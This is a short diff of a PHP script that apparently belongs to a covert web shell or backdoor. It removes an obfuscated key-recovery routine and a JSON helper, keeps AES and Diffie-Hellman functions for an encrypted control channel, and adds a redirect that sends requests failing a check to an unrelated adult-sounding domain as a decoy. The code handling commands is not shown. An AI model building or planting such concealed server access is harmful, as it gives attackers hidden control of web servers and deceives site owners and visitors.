@@ -22,7 +22,6 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE. 
 
-    
 
     ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
     ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
@@ -41,34 +40,8 @@ SOFTWARE.
      `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'   88 `"8bbdP"Y8 88       88   88,
                 aa,    ,88  aa,    ,88 88                                       "Y888
                  "Y8bbdP"    "Y8bbdP"  88
-
-
 */
 
-function deobfuscate_key($data) {
-	$prime = array();
-	$data = base64_decode($data);
-	$hex = '';
-	for ($i=2; $i<=strlen($data); $i++) {
-		$is_mul = false;
-		foreach ($prime as $p) {
-			if ($i % $p === 0) {
-				$is_mul = true;
-				break;
-			}
-		}
-		if ($is_mul === false) {
-			array_push($prime, $i);
-		}
-	}
-	foreach ($prime as $p) {
-		$hex .= $data[$p];
-	}
-	if ((strlen($hex) % 2 === 0) === false)  {
-		$hex .= hexdec(rand(0,15));
-	}
-	return hex2bin($hex);
-}
 
 function encrypt($text, $dhkey) {
 	$aes_key = substr($dhkey, 0, 32);
@@ -114,21 +87,6 @@ function diffiehellman($public_b) {
 	return hash('sha256', $session, false);
 }
 
-function array2json($row) {
-	if (count($row) === 1) {
-		foreach($row as $key => $value) {
-			$results = $value;
-		}
-	} else {
-		$results = '{';
-		foreach ($row as $key => $value) {
-			$results .= '"' . $key.'": "'.$value.'",';
-		}
-	}
-	$results = rtrim($results, ",");
-	$results .= '}';
-	return $results;
-}
 
 // main
 
@@ -156,6 +114,8 @@ try {
 					} 
 				} 
 			} 
+		} else {
+			header("Location: https://snapchat.sex/home.html");
 		}
 	}
 } catch (Exception $e) {
